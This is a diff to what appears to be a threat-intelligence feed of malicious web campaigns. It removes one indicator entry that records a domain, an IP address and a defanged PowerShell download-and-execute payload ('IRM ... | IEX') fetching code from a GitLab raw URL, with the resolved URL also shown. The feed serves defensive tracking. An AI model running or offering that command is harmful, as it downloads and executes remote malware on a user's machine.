@@ -3046,25 +3046,5 @@
     ],
     "ReportId": "cmwodzfal1z0v0omlds2tteaj",
     "ScannedAt": "2026-11-20T02:55:20.673000+00:00"
-  },
-  {
-    "UrlDomain": "thelilypadlearningcenter.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "72.167.68.110"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwobzc2a1yzx0oml26ze35ud",
-    "ScannedAt": "2026-11-20T01:59:17.278000+00:00"
   }
 ]
